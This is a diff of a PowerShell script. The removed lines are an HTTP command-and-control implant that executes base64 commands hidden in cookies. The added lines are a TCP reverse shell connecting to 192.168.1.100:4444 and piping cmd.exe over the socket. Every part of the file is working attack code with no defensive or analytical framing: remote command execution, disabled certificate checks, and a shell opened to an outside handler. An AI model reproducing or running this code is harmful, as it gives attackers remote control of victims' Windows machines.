@@ -1,36 +1,43 @@
-#Your handler URL - edit as needed
-$url = "https://192.168.1.100:443";
-#Magic header - change as needed for both client and the server 
-$m = "737060cd8c284d8af7ad3082f209582d";
-
-function w 
-{ 
-    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
-    $r = [System.Net.HttpWebRequest]::Create($url);
-    $r.Headers.Add('If-Match', $m);
-    $p = [System.Net.WebRequest]::GetSystemWebProxy();
-	# handle credetnails
-    $p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;
-    $r.proxy = $proxy;
-    return $r;
-}
-
-while ($true)
-{
-    $r = w;
-    try { $p = $r.GetResponse(); } catch { continue; }
-    $x = $p.GetResponseHeader("Set-Cookie");
-    if (![string]::IsNullOrEmpty($x))
-    {
-        $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x));
-        #invoke and catch any exceptions
-		try { $o = invoke-expression "$c" 2>&1 | Out-String; }
-        catch { $o = $_.Exception| Out-String; }
-		# get output back to the server in cookie
-        $o = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($o))
-        $r = w;
-        $r.Headers.Add('Cookie', $o);
-        $r.GetResponse().close();
-    }
-    $p.close();
-}
+$Net = netstat -n
+if ($Net -match "IP:PORT   ESTABLISHED"){exit}
+function cleanup {
+if ($client.Connected -eq $true) {$client.Close()}
+if ($process.ExitCode -ne $null) {$process.Close()}
+exit}
+$address = '192.168.1.100'
+$port = 4444
+$client = New-Object system.net.sockets.tcpclient
+$client.connect($address,$port)
+$stream = $client.GetStream()
+$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
+$process.StartInfo.RedirectStandardInput = 1
+$process.StartInfo.RedirectStandardOutput = 1
+$process.StartInfo.UseShellExecute = 0
+$process.Start()
+$inputstream = $process.StandardInput
+$outputstream = $process.StandardOutput
+Start-Sleep 1
+$encoding = new-object System.Text.AsciiEncoding
+while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
+$stream.Write($encoding.GetBytes($out),0,$out.Length)
+$out = $null; $done = $false; $testing = 0;
+while (-not $done) {
+if ($client.Connected -ne $true) {cleanup}
+$pos = 0; $i = 1
+while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
+$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
+$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
+if ($pos -gt 0) {
+$string = $encoding.GetString($networkbuffer,0,$pos)
+$inputstream.write($string)
+start-sleep 1
+if ($process.ExitCode -ne $null) {cleanup}
+else {
+$out = $encoding.GetString($outputstream.Read())
+while($outputstream.Peek() -ne -1){
+$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
+$stream.Write($encoding.GetBytes($out),0,$out.length)
+$out = $null
+$string = $null}} else {cleanup}}
